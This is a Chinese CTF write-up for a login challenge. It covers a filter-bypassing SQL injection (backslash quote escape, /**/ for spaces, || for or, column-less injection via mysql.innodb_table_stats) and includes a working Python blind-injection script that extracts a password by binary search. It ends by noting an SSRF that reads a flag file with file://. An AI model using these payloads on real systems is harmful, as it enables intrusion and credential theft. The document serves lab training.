# 解题方法

本题相对其他题较为复杂，但其实考点非常简单，我们发现存在登录界面，并且过滤了`or`,`'`,`空格`,`=`，就这么点，由于是登录题，其中sql语句为

```sql
SELECT username, password FROM users WHERE username='$uname' and password='$passwd';
```

那么很明显可以使用\来转义'，那么就变成了

```sql
SELECT username, password FROM users WHERE username='\' and password='||/**/1#';
```

发现后面的`'`闭合了前面的`'`，即`'\' and password='`，最后的'使用注释即可，空格使用/**/，or使用||，但or过滤了，无法使用information_schema，由于mysql 5.6 及以上版本 ，存在`mysql.innodb_table_stats`

我们打开我们的数据库即可看到的，会的到表名

![](https://files.catbox.moe/n62qbx.png)

但无法得到列名，这里需要无列名注入，需要知道有多少列

```sql
select `1` from (select 1,2,3 union select * from users)a;
select b from (select 1,2 as b,3 union select * from users)a;
```

也可以猜测列名为username和password直接求出密码

最后payload：(这里使用的二分法，相对于 regexp 来代替=快很多)

```python
import requests

url = "http://192.168.239.132:8302/login.php"
result = ''

for x in range(0, 100):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        #payload = "||/**/if(ascii(substr((database()),%d,1))>%d,1,0)#" % (x, mid)
        #payload = "||/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),%d,1))>%d,1,0)#" % (x, mid)
        payload = "||if(ascii(substr((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),%d,1))>%d,1,0)#" % (x, mid)
        #payload = "||/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/0,1),%d,1))>%d,1,0)#" % (x, mid)
        params = {
            'username':'\\',
            'password':payload
        }
        response = requests.post(url, data=params)
        if b'congratulations' in response.content:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)
```

![](https://files.catbox.moe/66gyk1.png)

得到密码即为第一个flag，登录，其实也可以使用万能密码直接进入

![](https://files.catbox.moe/zwilhh.png)

将url输入发现很明显的ssrf，直接使用file读文件，发现根目录的flag(直接送分)

